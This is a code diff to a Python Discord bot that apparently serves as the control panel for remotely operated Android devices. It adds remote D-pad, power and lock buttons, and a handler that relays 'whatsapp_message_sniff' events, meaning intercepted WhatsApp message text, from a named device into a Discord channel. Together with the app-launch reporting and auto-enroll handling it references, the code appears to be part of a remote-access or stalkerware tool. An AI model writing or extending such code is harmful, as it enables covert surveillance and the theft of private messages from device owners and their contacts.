@@ -470,7 +470,35 @@ class RemoteControlView(discord.ui.View):
     async def recents(self, interaction: discord.Interaction, button: discord.ui.Button):
         await self._send_action(interaction, "RECENTS")
 
-    @discord.ui.button(label="Notifications", style=discord.ButtonStyle.secondary, row=1)
+    @discord.ui.button(label="▲", style=discord.ButtonStyle.secondary, row=1)
+    async def up(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self._send_action(interaction, "UP")
+
+    @discord.ui.button(label="◀", style=discord.ButtonStyle.secondary, row=2)
+    async def left(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self._send_action(interaction, "LEFT")
+
+    @discord.ui.button(label="OK", style=discord.ButtonStyle.success, row=2)
+    async def enter(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self._send_action(interaction, "ENTER")
+
+    @discord.ui.button(label="▶", style=discord.ButtonStyle.secondary, row=2)
+    async def right(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self._send_action(interaction, "RIGHT")
+
+    @discord.ui.button(label="▼", style=discord.ButtonStyle.secondary, row=3)
+    async def down(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self._send_action(interaction, "DOWN")
+
+    @discord.ui.button(label="Power", style=discord.ButtonStyle.danger, row=4)
+    async def power(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self._send_action(interaction, "POWER")
+
+    @discord.ui.button(label="Lock", style=discord.ButtonStyle.secondary, row=4)
+    async def lock(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self._send_action(interaction, "LOCK")
+
+    @discord.ui.button(label="Notifications", style=discord.ButtonStyle.secondary, row=4)
     async def notifications(self, interaction: discord.Interaction, button: discord.ui.Button):
         await self._send_action(interaction, "NOTIFICATIONS")
 
@@ -1915,6 +1943,9 @@ class ADexDiscordClient(discord.Client):
         elif event_type == "app_launch":
             package = data.get("packageName") or "unknown"
             await channel.send(f"🚀 **App Launch** on `{device_id}`: `{package}`")
+        elif event_type == "whatsapp_message_sniff":
+            text = data.get("text") or ""
+            await channel.send(f"💬 **WhatsApp Message Snipped** on `{device_id}`:\n```{text}```")
 
     async def _handle_auto_enroll_event(self, payload: dict[str, Any]) -> None:
         channel_id_raw = payload.get("channelId")
